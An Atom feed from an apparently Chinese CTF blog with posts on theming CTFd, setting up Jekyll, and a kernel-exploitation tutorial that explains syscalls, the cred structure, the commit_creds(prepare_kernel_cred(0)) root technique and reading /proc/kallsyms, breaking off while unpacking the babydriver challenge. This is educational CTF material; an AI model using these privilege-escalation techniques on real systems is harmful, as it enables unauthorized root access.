<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B3ale</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2020-05-20T03:09:07.193Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自定义CTFd颜色主题</title>
    <link href="blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/"/>
    <id>blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/</id>
    <published>2020-05-20T02:32:37.000Z</published>
    <updated>2020-05-20T03:09:07.193Z</updated>
    
    <content type="html"><![CDATA[<p>今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。</p><a id="more"></a><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>以前练习平台其实搭过很多次，都是用 Ubuntu 或者直接 <code>docker-compose up</code> 起镜像。后来发现 <a href="https://hub.docker.com/r/ctfd/ctfd" target="_blank" rel="noopener">CTFd 在 Docker Hub 上</a>是有镜像的，直接拉下来就能装了。</p><pre><code class="bash">$ docker pull ctfd/ctfd$ screen docker run --name=&quot;ZJGSUCTF-2020&quot; -p 80:8000 -it ctfd/ctfd</code></pre><p>进入容器进行修改：</p><pre><code class="bash">$ docker ps -aCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES729035bc1dc7        ctfd/ctfd           &quot;/opt/CTFd/docker-en…&quot;   42 seconds ago      Up 38 seconds       0.0.0.0:80-&gt;8000/tcp     ZJGSUCTF-2020$ docker exec -it quizzical_mayer /bin/sh</code></pre><p>可以看到容器的启动脚本 <code>docker-entrypoint.sh</code>，其中用 <code>gunicorn</code> 作为 Web 服务器：</p><pre><code class="bash">/opt/CTFd $ tail docker-entrypoint.sh# Start CTFdecho &quot;Starting CTFd&quot;exec gunicorn &#39;CTFd:create_app()&#39; \    --bind &#39;0.0.0.0:8000&#39; \    --workers $WORKERS \    --worker-tmp-dir &quot;$WORKER_TEMP_DIR&quot; \    --worker-class &quot;$WORKER_CLASS&quot; \    --access-logfile &quot;$ACCESS_LOG&quot; \    --error-logfile &quot;$ERROR_LOG&quot;</code></pre><h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><p>对颜色的设置首先可以在 Admin Panel 里选择 Theme Color：</p><p><img src="/pics/自定义CTFd颜色主题/1.png" srcset="/img/loading.gif" alt></p><p>效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/2.png" srcset="/img/loading.gif" alt></p><p>改了 Theme Color 后，Challenge 里的每个 Challenge Box 的颜色还是没变，显得不太协调，可以在 themes 下修改对应的 css：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi main.min.css</code></pre><p><code>.btn-dark</code> 是默认的 Challenge Box 的颜色：</p><pre><code class="css">.btn-dark {  color: #fff;  background-color: #343a40;  border-color: #343a40;}</code></pre><p>还有修改 Solved Challenge Box 的颜色：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi challenge-board.min.css</code></pre><p>对应的样式如下：</p><pre><code class="css">.solved-challenge {  background-color: #37d63e !important;  opacity: 0.4;  border: none;}</code></pre><p>改完后的效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/3.png" srcset="/img/loading.gif" alt></p><h1 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h1><p>国外的开源项目总是会有一些问题，这里我们也要把对应的 <code>flag-icons.scss</code> 和 <code>__init__.py</code> 部分给删除，或者像 BUUOJ 一样改为 Taiwan SAR China：</p><pre><code class="bash">/opt/CTFd/CTFd $ grep -ir &quot;Taiwan&quot; *themes/core/assets/css/includes/flag-icons.scss:  // Taiwanutils/countries/__init__.py:    (&quot;TW&quot;, &quot;Taiwan&quot;),utils/countries/__pycache__/__init__.cpython-37.pyc:St. Martin)ZPMzSt. Pierre &amp; Miquelon)ZVCzSt. Vincent &amp; Grenadines)ZSDZSudan)ZSRSuriname)ZSJzSvalbard &amp; Jan Mayen)ZSZZ    Swaziland)ZSEZSweden)ZCHZ                                                                 Switzerland)ZSYZSyria)ZTWZTaiwan)ZTJZ</code></pre><p>由于这部分是用 Python 写的，不会实时更新，这里直接重启 <code>gunicorn</code> 来刷新缓存（重启第二个，也就是这里的 8 号进程）：</p><pre><code class="bash">/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -    8 ctfd      0:01 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   38 ctfd      0:00 grep gunicorn/opt/CTFd $ kill -HUP 8/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   39 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   41 ctfd      0:00 grep gunicorn</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/huchong/p/9844024.html" target="_blank" rel="noopener">https://www.cnblogs.com/huchong/p/9844024.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="ctfd" scheme="blog.b3ale.cn/tags/ctfd/"/>
    
  </entry>
  
  <entry>
    <title>macOS下使用Jekyll和Coding搭建博客</title>
    <link href="blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-05-17T06:34:31.000Z</published>
    <updated>2020-05-17T07:53:59.307Z</updated>
    
    <content type="html"><![CDATA[<p>仅作记录。</p><a id="more"></a><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>环境是 macOS Mojave，像是 command-line tools、ruby 之类的安装就不记录了。用的是 Coding 提供的静态网站服务，经过测试 jekyll 3.5 可以正常部署（版本过高在部署的时候会报错），依次安装对应的 bundle 和 jekyll：</p><pre><code class="bash">$ gem install bundle:1.15.4$ gem install -n /usr/local/bin/ jekyll -v &quot;3.5&quot;</code></pre><h1 id="Setup-Site"><a href="#Setup-Site" class="headerlink" title="Setup Site"></a>Setup Site</h1><p>先在 coding 上创建一个新的仓库，并开启静态网站服务，然后克隆到本地：</p><pre><code class="bash">$ git clone xxx.git blog &amp;&amp; cd blog</code></pre><p>接下来用 <code>jekyll new .</code> 在仓库中新建静态网站，并做相关的依赖安装，最后用 <code>jekyll build</code> 生成静态网站代码：</p><pre><code class="bash">$ bundle exec jekyll new .$ bundle install$ bundle exec jekyll build</code></pre><p>不看 git 的话，大概会有如下的文件。大致上和 hexo 的根目录差不了太多：</p><pre><code class="bash">$ find .../_posts./_posts/2020-05-17-welcome-to-jekyll.markdown./.sass-cache./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_syntax-highlighting.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_base.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_layout.scssc./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f/minima.scssc./404.html./.gitignore./index.md./_site./_site/feed.xml./_site/jekyll./_site/jekyll/update./_site/jekyll/update/2020./_site/jekyll/update/2020/05./_site/jekyll/update/2020/05/17./_site/jekyll/update/2020/05/17/welcome-to-jekyll.html./_site/index.html./_site/404.html./_site/about./_site/about/index.html./_site/assets./_site/assets/main.css./_site/assets/minima-social-icons.svg./_config.yml./Gemfile./Gemfile.lock</code></pre><p>可以用 <code>jekyll serve</code> 在本地对网站进行预览：</p><pre><code class="bash">$ bundle exec jekyll serve</code></pre><p>最后用 git 把代码同步到远程仓库，并在 coding 上进行部署即可：</p><pre><code class="bash">$ git add --all .$ git commit -m &quot;message&quot;$ git push origin master</code></pre><p>jekyll 默认主题比较简洁，我个人比较喜欢。但好像相比 hexo 对文章的管理要麻烦一点。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://jekyllrb.com/docs/installation/" target="_blank" rel="noopener">https://jekyllrb.com/docs/installation/</a><br><a href="https://www.jianshu.com/p/9f198d5779e6" target="_blank" rel="noopener">https://www.jianshu.com/p/9f198d5779e6</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;仅作记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
      <category term="jekyll" scheme="blog.b3ale.cn/tags/jekyll/"/>
    
      <category term="coding" scheme="blog.b3ale.cn/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Stashing Unlink Attack</title>
    <link href="blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/"/>
    <id>blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/</id>
    <published>2020-05-05T11:03:01.000Z</published>
    <updated>2020-05-21T13:04:23.431Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="951e386c401880b661626507b76779059b3c6fbcff2c05b8082f00bb8a636028"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Sorry, the article is encrypted.
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Basic Kernel Exploitation</title>
    <link href="blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/"/>
    <id>blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/</id>
    <published>2020-04-26T15:26:55.000Z</published>
    <updated>2020-05-17T07:54:10.485Z</updated>
    
    <content type="html"><![CDATA[<p>初涉 Kernel Exploit。</p><a id="more"></a><blockquote><p>基本是跟着 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">CTF-Wiki</a> 和 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x 师傅</a>做的内容。</p></blockquote><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p>一部分内容在 <a href="https://github.com/qianfei11/UnixNotebook" target="_blank" rel="noopener">Unix 系统分析课的笔记</a>中有所记录。</p><h2 id="What-is-kernel"><a href="#What-is-kernel" class="headerlink" title="What is kernel?"></a>What is kernel?</h2><p>Kernel 是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。最主要的功能有两点（包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能）：</p><ol><li>控制并与硬件进行交互；</li><li>提供 Application 能运行的环境。</li></ol><blockquote><p>应用程序的 crash 直接终止程序，而内核的 crash 会直接引发重启。</p></blockquote><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>Intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2 和 Ring 3。Ring 0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。而使用 Ring Model 是为了提升系统安全性。</p><blockquote><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p></blockquote><h2 id="Loadable-Kernel-Modules（LKMs）"><a href="#Loadable-Kernel-Modules（LKMs）" class="headerlink" title="Loadable Kernel Modules（LKMs）"></a>Loadable Kernel Modules（LKMs）</h2><p>可加载核心模块（内核模块）就像运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序（Device Drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><blockquote><p>LKMs 的文件格式和用户态的可执行程序相同，因此可以使用 IDA 等工具来分析内核模块。</p></blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核（Monolithic Kernel）。单内核的优点是效率高，所有的内容都集合在一起，但是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装。</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><code>ioctl</code> 是一个系统调用，用于与设备通信：</p><pre><code class="txt">IOCTL(2)                    BSD System Calls Manual                   IOCTL(2)NAME     ioctl -- control deviceSYNOPSIS     #include &lt;sys/ioctl.h&gt;     int     ioctl(int fildes, unsigned long request, ...);DESCRIPTION     The ioctl() function manipulates the underlying device parameters of special files.  In particular, many operat-     ing characteristics of character special files (e.g. terminals) may be controlled with ioctl() requests.  The     argument fildes must be an open file descriptor.     An  ioctl request has encoded in it whether the argument is an ``in&#39;&#39; parameter or ``out&#39;&#39; parameter, and the     size of the argument argp in bytes.  Macros and defines used in specifying an ioctl request are located in the     file &lt;sys/ioctl.h&gt;.</code></pre><ul><li>第一个参数 <code>fildes</code> 为打开设备返回的文件描述符；</li><li>第二个参数 <code>request</code> 为用户程序对设备的控制命令；</li><li>再后边的参数则是一些补充参数，与设备有关。</li></ul><p>内核使用 <code>ioctl</code> 进行通信的原因：</p><ul><li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址，但访问非标准硬件设备这些系统调用显得不合适，有时候用户模式可能需要直接访问设备；</li><li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 <code>ioctl</code> 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li></ul><h2 id="Status-Switching"><a href="#Status-Switching" class="headerlink" title="Status Switching"></a>Status Switching</h2><h3 id="User-Space-to-Kernel-Space"><a href="#User-Space-to-Kernel-Space" class="headerlink" title="User Space to Kernel Space"></a>User Space to Kernel Space</h3><p>当发生<strong>系统调用</strong>、产生<strong>异常、</strong>外设产生<strong>中断</strong>等事件时，会发生用户态到内核态的切换。步骤如下：</p><ol><li>用 <code>SWAPGS</code> 指令切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用；</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 RSP/ESP；</li><li>用 PUSH 指令保存各寄存器值；</li><li>判断是否为 <code>x32_abi</code>；</li><li>根据系统调用号跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><p><a href="https://elixir.bootlin.com/linux/v4.12/source/arch/x86/entry/entry_64.S#L136" target="_blank" rel="noopener">保存用户态各个寄存器的值</a>：</p><pre><code class="nasm">ENTRY(entry_SYSCALL_64)    /*     * Interrupts are off on entry.     * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,     * it is too small to ever cause noticeable irq latency.     */    SWAPGS_UNSAFE_STACK    /*     * A hypervisor implementation might want to use a label     * after the swapgs, so that it can do the swapgs     * for the guest and jump here on syscall.     */GLOBAL(entry_SYSCALL_64_after_swapgs)    movq    %rsp, PER_CPU_VAR(rsp_scratch)    movq    PER_CPU_VAR(cpu_current_top_of_stack), %rsp    TRACE_IRQS_OFF    /* Construct struct pt_regs on stack */    pushq    $__USER_DS            /* pt_regs-&gt;ss */    pushq    PER_CPU_VAR(rsp_scratch)    /* pt_regs-&gt;sp */    pushq    %r11                /* pt_regs-&gt;flags */    pushq    $__USER_CS            /* pt_regs-&gt;cs */    pushq    %rcx                /* pt_regs-&gt;ip */    pushq    %rax                /* pt_regs-&gt;orig_ax */    pushq    %rdi                /* pt_regs-&gt;di */    pushq    %rsi                /* pt_regs-&gt;si */    pushq    %rdx                /* pt_regs-&gt;dx */    pushq    %rcx                /* pt_regs-&gt;cx */    pushq    $-ENOSYS            /* pt_regs-&gt;ax */    pushq    %r8                /* pt_regs-&gt;r8 */    pushq    %r9                /* pt_regs-&gt;r9 */    pushq    %r10                /* pt_regs-&gt;r10 */    pushq    %r11                /* pt_regs-&gt;r11 */    sub    $(6*8), %rsp            /* pt_regs-&gt;bp, bx, r12-15 not saved */</code></pre><h3 id="Kernel-Space-to-User-Space"><a href="#Kernel-Space-to-User-Space" class="headerlink" title="Kernel Space to User Space"></a>Kernel Space to User Space</h3><p>退出内核态的步骤如下：</p><ol><li>通过 <code>SWAPGS</code> 恢复 GS 值；</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户上下文继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, EFLAGS/RFLAGS, ESP/RSP 等）。</li></ol><h2 id="Process-Structure"><a href="#Process-Structure" class="headerlink" title="Process Structure"></a>Process Structure</h2><p>Kernel 中使用 <a href="https://elixir.bootlin.com/linux/v4.12/source/include/linux/cred.h#L110" target="_blank" rel="noopener"><code>cred</code> 结构体</a>记录进程的权限等信息（uid、gid 等），如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p><pre><code class="cpp">/* * The security context of a task * * The parts of the context break down into two categories: * *  (1) The objective context of a task.  These parts are used when some other *    task is attempting to affect this one. * *  (2) The subjective context.  These details are used when the task is acting *    upon another object, be that a file, a task, a key or whatever. * * Note that some members of this structure belong to both categories - the * LSM security pointer for instance. * * A task has two security pointers.  task-&gt;real_cred points to the objective * context that defines that task&#39;s actual details.  The objective part of this * context is used whenever that task is acted upon. * * task-&gt;cred points to the subjective context that defines the details of how * that task is going to act upon another object.  This may be overridden * temporarily to point to another security context, but normally points to the * same context as task-&gt;real_cred. */struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><h2 id="Functions-in-Kernel"><a href="#Functions-in-Kernel" class="headerlink" title="Functions in Kernel"></a>Functions in Kernel</h2><p>内核态中的函数对应用户态函数：</p><ul><li><code>printf()</code> -&gt; <code>printk()</code><ul><li><code>printk()</code> 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li></ul></li><li><code>memcpy()</code> -&gt; <code>copy_from_user()</code>/<code>copy_to_user()</code><ul><li><code>copy_from_user()</code>：实现了将用户空间的数据传送到内核空间</li><li><code>copy_to_user()</code>：实现了将内核空间的数据传送到用户空间</li></ul></li><li><code>malloc()</code> -&gt; <code>kmalloc()</code><ul><li>内核态的内存分配函数，和 <code>malloc()</code> 相似，但使用的是 <code>slab/slub</code> 分配器</li></ul></li><li><code>free()</code> -&gt; <code>kfree()</code>，同 <code>kmalloc()</code></li></ul><p>同时 Kernel 中有两个（<a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L423" target="_blank" rel="noopener"><code>int commit_creds(struct cred *new)</code></a> 和 <a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L595" target="_blank" rel="noopener"><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code></a>）可以改变权限的函数：</p><pre><code class="cpp">/** * commit_creds - Install new credentials upon the current task * @new: The credentials to be assigned * * Install a new set of credentials to the current task, using RCU to replace * the old set.  Both the objective and the subjective credentials pointers are * updated.  This function may not be called if the subjective credentials are * in an overridden state. * * This function eats the caller&#39;s reference to the new credentials. * * Always returns 0 thus allowing this function to be tail-called at the end * of, say, sys_setgid(). */int commit_creds(struct cred *new){    struct task_struct *task = current;    const struct cred *old = task-&gt;real_cred;    kdebug(&quot;commit_creds(%p{%d,%d})&quot;, new,           atomic_read(&amp;new-&gt;usage),           read_cred_subscribers(new));    BUG_ON(task-&gt;cred != old);#ifdef CONFIG_DEBUG_CREDENTIALS    BUG_ON(read_cred_subscribers(old) &lt; 2);    validate_creds(old);    validate_creds(new);#endif    BUG_ON(atomic_read(&amp;new-&gt;usage) &lt; 1);    get_cred(new); /* we will require a ref for the subj creds too */    /* dumpability changes */    if (!uid_eq(old-&gt;euid, new-&gt;euid) ||        !gid_eq(old-&gt;egid, new-&gt;egid) ||        !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||        !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||        !cred_cap_issubset(old, new)) {        if (task-&gt;mm)            set_dumpable(task-&gt;mm, suid_dumpable);        task-&gt;pdeath_signal = 0;        smp_wmb();    }    /* alter the thread keyring */    if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))        key_fsuid_changed(task);    if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))        key_fsgid_changed(task);    /* do it     * RLIMIT_NPROC limits on user-&gt;processes have already been checked     * in set_user().     */    alter_cred_subscribers(new, 2);    if (new-&gt;user != old-&gt;user)        atomic_inc(&amp;new-&gt;user-&gt;processes);    rcu_assign_pointer(task-&gt;real_cred, new);    rcu_assign_pointer(task-&gt;cred, new);    if (new-&gt;user != old-&gt;user)        atomic_dec(&amp;old-&gt;user-&gt;processes);    alter_cred_subscribers(old, -2);    /* send notifications */    if (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||        !uid_eq(new-&gt;euid,  old-&gt;euid) ||        !uid_eq(new-&gt;suid,  old-&gt;suid) ||        !uid_eq(new-&gt;fsuid, old-&gt;fsuid))        proc_id_connector(task, PROC_EVENT_UID);    if (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||        !gid_eq(new-&gt;egid,  old-&gt;egid) ||        !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||        !gid_eq(new-&gt;fsgid, old-&gt;fsgid))        proc_id_connector(task, PROC_EVENT_GID);    /* release the old obj and subj refs both */    put_cred(old);    put_cred(old);    return 0;}/** * prepare_kernel_cred - Prepare a set of credentials for a kernel service * @daemon: A userspace daemon to be used as a reference * * Prepare a set of credentials for a kernel service.  This can then be used to * override a task&#39;s own credentials so that work can be done on behalf of that * task that requires a different subjective context. * * @daemon is used to provide a base for the security record, but can be NULL. * If @daemon is supplied, then the security data will be derived from that; * otherwise they&#39;ll be set to 0 and no groups, full capabilities and no keys. * * The caller may change these controls afterwards if desired. * * Returns the new credentials or NULL if out of memory. * * Does not take, and does not return holding current-&gt;cred_replace_mutex. */struct cred *prepare_kernel_cred(struct task_struct *daemon){    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);    validate_creds(old);    *new = *old;    atomic_set(&amp;new-&gt;usage, 1);    set_cred_subscribers(new, 0);    get_uid(new-&gt;user);    get_user_ns(new-&gt;user_ns);    get_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS    new-&gt;session_keyring = NULL;    new-&gt;process_keyring = NULL;    new-&gt;thread_keyring = NULL;    new-&gt;request_key_auth = NULL;    new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY    new-&gt;security = NULL;#endif    if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)        goto error;    put_cred(old);    validate_creds(new);    return new;error:    put_cred(new);    put_cred(old);    return NULL;}</code></pre><p>执行 <code>commit_creds(prepare_kernel_cred(0));</code> 即可获得 root 权限。两个函数的地址都可以在 <code>/proc/kallsyms</code> 文件中查看：</p><pre><code class="bash">$ sudo cat /proc/kallsyms | grep -E &quot;commit_creds|prepare_kernel_cred&quot;ffffffff810a24a0 T commit_credsffffffff810a2890 T prepare_kernel_credffffffff81d7f6c0 R __ksymtab_commit_credsffffffff81d881d0 R __ksymtab_prepare_kernel_credffffffff81d9f028 r __kcrctab_commit_credsffffffff81da35b0 r __kcrctab_prepare_kernel_credffffffff81db01e7 r __kstrtab_prepare_kernel_credffffffff81db022e r __kstrtab_commit_creds</code></pre><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><ul><li>CANARY、DEP、PIE、RELRO 等保护与用户态原理和作用相同；</li><li>smep（Supervisor Mode Execution Protection）：当处理器处于 Ring 0 模式时，执行用户空间的代码会触发页错误；</li><li>smap（Superivisor Mode Access Protection）：类似于 smep，通常是在访问数据时；</li><li>mmap_min_addr：控制着 mmap 能够映射的最低内存地址。</li></ul><h1 id="Kernel-UAF（CISCN-2017-babydriver）"><a href="#Kernel-UAF（CISCN-2017-babydriver）" class="headerlink" title="Kernel UAF（CISCN-2017-babydriver）"></a>Kernel UAF（CISCN-2017-babydriver）</h1><p>题目中给了三个文件，<code>boot.sh</code>、<code>bzImage</code> 和 <code>rootfs.cpio</code>。<code>bzImage</code> 即为被压缩的内核可执行文件；<code>boot.sh</code> 为 QEMU 的启动脚本：</p><pre><code class="bash">$ tar -xvf babydriver.tarx boot.shx bzImagex rootfs.cpio$ file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA$ bat boot.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: boot.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console       │ =ttyS0 root=/dev/ram oops=panic panic=1&#39; -enable-kvm -monitor /dev/null       │  -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来主要看文件系统 <code>rootfs.cpio</code>。用 <code>gunzip</code> 对其进行解压缩，可以看到用的是 4.4.72 的内核，然后可以看到根目录下有一个 init 启动脚本，用来设置 flag 的相关权限和安装 babydriver 模块。也就是说只有变成 root 才能查看 flag：</p><pre><code class="bash">$ file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix$ mv rootfs.cpio rootfs.cpio.gz$ gunzip ./rootfs.cpio.gz$ file rootfs.cpiorootfs.cpio: ASCII cpio archive (SVR4 with no CRC)$ mkdir fs &amp;&amp; cd fs$ cpio -idmv &lt; ../rootfs.cpio.etcetc/init.detc/passwdetc/groupbin...initprocliblib/moduleslib/modules/4.4.72lib/modules/4.4.72/babydriver.kosysusr...tmplinuxrchomehome/ctf5556 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │   3   │ 